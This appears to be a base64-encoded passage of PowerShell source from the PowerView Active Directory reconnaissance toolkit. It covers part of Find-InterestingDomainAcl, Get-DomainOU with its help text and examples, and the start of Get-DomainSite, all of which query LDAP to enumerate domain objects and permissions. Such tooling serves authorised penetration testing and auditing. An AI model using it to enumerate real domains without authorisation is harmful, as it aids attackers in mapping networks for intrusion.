0eVJlZmVyZW5jZUNsYXNzID0gJ2dyb3VwJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRPYmplY3QuUHJvcGVydGllcy5vYmplY3RjbGFzcyAtbWF0Y2ggJ3VzZXInKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eVJlZmVyZW5jZUNsYXNzID0gJ3VzZXInCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlSZWZlcmVuY2VDbGFzcyA9ICROdWxsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHNhdmUgc28gd2UgZG9uJ3QgbG9vayB1cCBtb3JlIHRoYW4gb25jZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSZXNvbHZlZFNJRHNbJF8uU2VjdXJpdHlJZGVudGlmaWVyLlZhbHVlXSA9ICRJZGVudGl0eVJlZmVyZW5jZU5hbWUsICRJZGVudGl0eVJlZmVyZW5jZURvbWFpbiwgJElkZW50aXR5UmVmZXJlbmNlRE4sICRJZGVudGl0eVJlZmVyZW5jZUNsYXNzCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJbnRlcmVzdGluZ0FDTCA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnT2JqZWN0RE4nICRfLk9iamVjdEROCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0FjZVF1YWxpZmllcicgJF8uQWNlUXVhbGlmaWVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0FjdGl2ZURpcmVjdG9yeVJpZ2h0cycgJF8uQWN0aXZlRGlyZWN0b3J5UmlnaHRzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRfLk9iamVjdEFjZVR5cGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ09iamVjdEFjZVR5cGUnICRfLk9iamVjdEFjZVR5cGUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJbnRlcmVzdGluZ0FDTCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdPYmplY3RBY2VUeXBlJyAnTm9uZScKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0FjZUZsYWdzJyAkXy5BY2VGbGFncwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJbnRlcmVzdGluZ0FDTCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdBY2VUeXBlJyAkXy5BY2VUeXBlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0luaGVyaXRhbmNlRmxhZ3MnICRfLkluaGVyaXRhbmNlRmxhZ3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnU2VjdXJpdHlJZGVudGlmaWVyJyAkXy5TZWN1cml0eUlkZW50aWZpZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnSWRlbnRpdHlSZWZlcmVuY2VOYW1lJyAkSWRlbnRpdHlSZWZlcmVuY2VOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0lkZW50aXR5UmVmZXJlbmNlRG9tYWluJyAkSWRlbnRpdHlSZWZlcmVuY2VEb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnSWRlbnRpdHlSZWZlcmVuY2VETicgJElkZW50aXR5UmVmZXJlbmNlRE4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnSWRlbnRpdHlSZWZlcmVuY2VDbGFzcycgJElkZW50aXR5UmVmZXJlbmNlQ2xhc3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltGaW5kLUludGVyZXN0aW5nRG9tYWluQWNsXSBVbmFibGUgdG8gY29udmVydCBTSUQgJyQoJF8uU2VjdXJpdHlJZGVudGlmaWVyLlZhbHVlICknIHRvIGEgZGlzdGluZ3Vpc2hlZG5hbWUgd2l0aCBDb252ZXJ0LUFETmFtZSIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Eb21haW5PVSB7CjwjCi5TWU5PUFNJUwoKU2VhcmNoIGZvciBhbGwgb3JnYW5pemF0aW9uIHVuaXRzIChPVXMpIG9yIHNwZWNpZmljIE9VIG9iamVjdHMgaW4gQUQuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1Eb21haW5TZWFyY2hlciwgQ29udmVydC1MREFQUHJvcGVydHkgIAoKLkRFU0NSSVBUSU9OCgpCdWlsZHMgYSBkaXJlY3Rvcnkgc2VhcmNoZXIgb2JqZWN0IHVzaW5nIEdldC1Eb21haW5TZWFyY2hlciwgYnVpbGRzIGEgY3VzdG9tCkxEQVAgZmlsdGVyIGJhc2VkIG9uIHRhcmdldGluZy9maWx0ZXIgcGFyYW1ldGVycywgYW5kIHNlYXJjaGVzIGZvciBhbGwgb2JqZWN0cwptYXRjaGluZyB0aGUgY3JpdGVyaWEuIFRvIG9ubHkgcmV0dXJuIHNwZWNpZmljIHByb3BlcnRpZXMsIHVzZQoiLVByb3BlcnRpZXMgd2hlbmNyZWF0ZWQsdXNuY2hhbmdlZCwuLi4iLiBCeSBkZWZhdWx0LCBhbGwgT1Ugb2JqZWN0cyBmb3IKdGhlIGN1cnJlbnQgZG9tYWluIGFyZSByZXR1cm5lZC4KCi5QQVJBTUVURVIgSWRlbnRpdHkKCkFuIE9VIG5hbWUgKGUuZy4gVGVzdE9VKSwgRGlzdGluZ3Vpc2hlZE5hbWUgKGUuZy4gT1U9VGVzdE9VLERDPXRlc3RsYWIsREM9bG9jYWwpLCBvcgpHVUlEIChlLmcuIDhhOWJhMjJhLTg5NzctNDdlNi04NGNlLThjMjZhZjRlMWU2YSkuIFdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgR1BMaW5rCgpPbmx5IHJldHVybiBPVXMgd2l0aCB0aGUgc3BlY2lmaWVkIEdVSUQgaW4gdGhlaXIgZ3BsaW5rIHByb3BlcnR5LgoKLlBBUkFNRVRFUiBEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIHVzZSBmb3IgdGhlIHF1ZXJ5LCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIExEQVBGaWx0ZXIKClNwZWNpZmllcyBhbiBMREFQIHF1ZXJ5IHN0cmluZyB0aGF0IGlzIHVzZWQgdG8gZmlsdGVyIEFjdGl2ZSBEaXJlY3Rvcnkgb2JqZWN0cy4KCi5QQVJBTUVURVIgUHJvcGVydGllcwoKU3BlY2lmaWVzIHRoZSBwcm9wZXJ0aWVzIG9mIHRoZSBvdXRwdXQgb2JqZWN0IHRvIHJldHJpZXZlIGZyb20gdGhlIHNlcnZlci4KCi5QQVJBTUVURVIgU2VhcmNoQmFzZQoKVGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoLCBlLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiClVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvLgoKLlBBUkFNRVRFUiBTZWFyY2hTY29wZQoKU3BlY2lmaWVzIHRoZSBzY29wZSB0byBzZWFyY2ggdW5kZXIsIEJhc2UvT25lTGV2ZWwvU3VidHJlZSAoZGVmYXVsdCBvZiBTdWJ0cmVlKS4KCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouUEFSQU1FVEVSIFNlcnZlclRpbWVMaW1pdAoKU3BlY2lmaWVzIHRoZSBtYXhpbXVtIGFtb3VudCBvZiB0aW1lIHRoZSBzZXJ2ZXIgc3BlbmRzIHNlYXJjaGluZy4gRGVmYXVsdCBvZiAxMjAgc2Vjb25kcy4KCi5QQVJBTUVURVIgU2VjdXJpdHlNYXNrcwoKU3BlY2lmaWVzIGFuIG9wdGlvbiBmb3IgZXhhbWluaW5nIHNlY3VyaXR5IGluZm9ybWF0aW9uIG9mIGEgZGlyZWN0b3J5IG9iamVjdC4KT25lIG9mICdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcuCgouUEFSQU1FVEVSIEZpbmRPbmUKCk9ubHkgcmV0dXJuIG9uZSByZXN1bHQgb2JqZWN0LgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5QQVJBTUVURVIgUmF3CgpTd2l0Y2guIFJldHVybiByYXcgcmVzdWx0cyBpbnN0ZWFkIG9mIHRyYW5zbGF0aW5nIHRoZSBmaWVsZHMgaW50byBhIGN1c3RvbSBQU09iamVjdC4KCi5FWEFNUExFCgpHZXQtRG9tYWluT1UKClJldHVybnMgdGhlIGN1cnJlbnQgT1VzIGluIHRoZSBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpbk9VICphZG1pbiogLURvbWFpbiB0ZXN0bGFiLmxvY2FsCgpSZXR1cm5zIGFsbCBPVXMgd2l0aCAiYWRtaW4iIGluIHRoZWlyIG5hbWUgaW4gdGhlIHRlc3RsYWIubG9jYWwgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5PVSAtR1BMaW5rICJGMjYwQjc2RC01NUM4LTQ2QzUtQkVGMS05MDE2REQ5OEUyNzIiCgpSZXR1cm5zIGFsbCBPVXMgd2l0aCBsaW5rZWQgdG8gdGhlIHNwZWNpZmllZCBncm91cCBwb2xpY3kgb2JqZWN0LgoKLkVYQU1QTEUKCiIqYWRtaW4qIiwiKnNlcnZlcioiIHwgR2V0LURvbWFpbk9VCgpTZWFyY2ggZm9yIE9VcyB3aXRoIHRoZSBzcGVjaWZpYyBuYW1lcy4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtRG9tYWluT1UgLUNyZWRlbnRpYWwgJENyZWQKCi5PVVRQVVRTCgpQb3dlclZpZXcuT1UKCkN1c3RvbSBQU09iamVjdCB3aXRoIHRyYW5zbGF0ZWQgT1UgcHJvcGVydHkgZmllbGRzLgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3Lk9VJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSWRlbnRpdHksCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICBbQWxpYXMoJ0dVSUQnKV0KICAgICAgICAkR1BMaW5rLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExEQVBGaWx0ZXIsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQcm9wZXJ0aWVzLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWN1cml0eU1hc2tzLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCgogICAgICAgIFtBbGlhcygnUmV0dXJuT25lJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRmluZE9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRSYXcKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXSA9ICRQcm9wZXJ0aWVzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlY3VyaXR5TWFza3MnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlY3VyaXR5TWFza3MnXSA9ICRTZWN1cml0eU1hc2tzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICRPVVNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIGlmICgkT1VTZWFyY2hlcikgewogICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgPSAnJwogICAgICAgICAgICAkRmlsdGVyID0gJycKICAgICAgICAgICAgJElkZW50aXR5IHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkSWRlbnRpdHlJbnN0YW5jZSA9ICRfLlJlcGxhY2UoJygnLCAnXDI4JykuUmVwbGFjZSgnKScsICdcMjknKQogICAgICAgICAgICAgICAgaWYgKCRJZGVudGl0eUluc3RhbmNlIC1tYXRjaCAnXk9VPS4qJykgewogICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHdWlkQnl0ZVN0cmluZyA9ICgtSm9pbiAoKFtHdWlkXSRJZGVudGl0eUluc3RhbmNlKS5Ub0J5dGVBcnJheSgpIHwgRm9yRWFjaC1PYmplY3QgeyRfLlRvU3RyaW5nKCdYJykuUGFkTGVmdCgyLCcwJyl9KSkgLVJlcGxhY2UgJyguLiknLCdcJDEnCiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKSIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihuYW1lPSRJZGVudGl0eUluc3RhbmNlKSIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRJZGVudGl0eUZpbHRlciAtYW5kICgkSWRlbnRpdHlGaWx0ZXIuVHJpbSgpIC1uZSAnJykgKSB7CiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIofCRJZGVudGl0eUZpbHRlcikiCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0dQTGluayddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbk9VXSBTZWFyY2hpbmcgZm9yIE9VcyB3aXRoICRHUExpbmsgc2V0IGluIHRoZSBncExpbmsgcHJvcGVydHkiCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIoZ3BsaW5rPSokR1BMaW5rKikiCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5PVV0gVXNpbmcgYWRkaXRpb25hbCBMREFQIGZpbHRlcjogJExEQVBGaWx0ZXIiCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIkTERBUEZpbHRlciIKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJE9VU2VhcmNoZXIuZmlsdGVyID0gIigmKG9iamVjdENhdGVnb3J5PW9yZ2FuaXphdGlvbmFsVW5pdCkkRmlsdGVyKSIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5PVV0gR2V0LURvbWFpbk9VIGZpbHRlciBzdHJpbmc6ICQoJE9VU2VhcmNoZXIuZmlsdGVyKSIKCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZpbmRPbmUnXSkgeyAkUmVzdWx0cyA9ICRPVVNlYXJjaGVyLkZpbmRPbmUoKSB9CiAgICAgICAgICAgIGVsc2UgeyAkUmVzdWx0cyA9ICRPVVNlYXJjaGVyLkZpbmRBbGwoKSB9CiAgICAgICAgICAgICRSZXN1bHRzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSYXcnXSkgewogICAgICAgICAgICAgICAgICAgICMgcmV0dXJuIHJhdyByZXN1bHQgb2JqZWN0cwogICAgICAgICAgICAgICAgICAgICRPVSA9ICRfCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkT1UgPSBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAtUHJvcGVydGllcyAkXy5Qcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkT1UuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3Lk9VJykKICAgICAgICAgICAgICAgICRPVQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUmVzdWx0cykgewogICAgICAgICAgICAgICAgdHJ5IHsgJFJlc3VsdHMuZGlzcG9zZSgpIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbk9VXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0OiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkT1VTZWFyY2hlci5kaXNwb3NlKCkKICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtRG9tYWluU2l0ZSB7CjwjCi5TWU5PUFNJUwoKU2VhcmNoIGZvciBhbGwgc2l0ZXMgb3Igc3BlY2lmaWMgc2l0ZSBvYmplY3RzIGluIEFELgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluU2VhcmNoZXIsIENvbnZlcnQtTERBUFByb3BlcnR5ICAKCi5ERVNDUklQVElPTgoKQnVpbGRzIGEgZGlyZWN0b3J5IHNlYXJjaGVyIG9iamVjdCB1c2luZyBHZXQtRG9tYWluU2VhcmNoZXIsIGJ1aWxkcyBhIGN1c3RvbQpMREFQIGZpbHRlciBiYXNlZCBvbiB0YXJnZXRpbmcvZmlsdGVyIHBhcmFtZXRlcnMsIGFuZCBzZWFyY2hlcyBmb3IgYWxsIG9iamVjdHMKbWF0Y2hpbmcgdGhlIGNyaXRlcmlhLiBUbyBvbmx5IHJldHVybiBzcGVjaWZpYyBwcm9wZXJ0aWVzLCB1c2UKIi1Qcm9wZXJ0aWVzIHdoZW5jcmVhdGVkLHVzbmNoYW5nZWQsLi4uIi4gQnkgZGVmYXVsdCwgYWxsIHNpdGUgb2JqZWN0cyBmb3IKdGhlIGN1cnJlbnQgZG9tYWluIGFyZSByZXR1cm5lZC4KCi5QQVJBTUVURVIgSWRlbnRpdHkKCkFuIHNpdGUgbmFtZSAoZS5nLiBUZXN0LVNpdGUpLCBEaXN0aW5ndWlzaGVkTmFtZSAoZS5nLiBDTj1UZXN0LVNpdGUsQ049U2l0ZXMsQ049Q29uZmlndXJhdGlvbixEQz10ZXN0bGFiLERDPWxvY2FsKSwgb3IKR1VJRCAoZS5nLiBjMzc3MjZlZi0yYjY0LTQ1MjQtYjg1Yi02YTk3MDBjMjM0ZGQpLiBXaWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIEdQTGluawoKT25seSByZXR1cm4gc2l0ZXMgd2l0aCB0aGUgc3BlY2lmaWVkIEdVSUQgaW4gdGhlaXIgZ3BsaW5rIHByb3BlcnR5LgoKLlBBUkFNRVRFUiBEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIHVzZSBmb3IgdGhlIHF1ZXJ5LCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIExEQVBGaWx0ZXIKClNwZWNpZmllcyBhbiBMREFQIHF1ZXJ5IHN0cmluZyB0aGF0IGlzIHVzZWQgdG8gZmlsdGVyIEFjdGl2ZSBEaXJlY3Rvcnkgb2JqZWN0cy4KCi5QQVJBTUVURVIgUHJvcGVydGllcwoKU3BlY2lmaWVzIHRoZSBwcm9wZXJ0aWVzIG9mIHRoZSBvdXRwdXQgb2JqZWN0IHRvIHJldHJpZXZlIGZyb20gdGhlIHNlcnZlci4KCi5QQVJBTUVURVIgU2VhcmNoQmFzZQoKVGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoLCBlLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiClVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvLgoKLlBBUkFNRVRFUiBTZWFyY2hTY29wZQoKU3BlY2lmaWVzIHRoZSBzY29wZSB0byBzZWFyY2ggdW5kZXIsIEJhc2UvT25lTGV2ZWwvU3VidHJlZSAoZGVmYXVsdCBvZiBTdWJ0cmVlKS4KCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2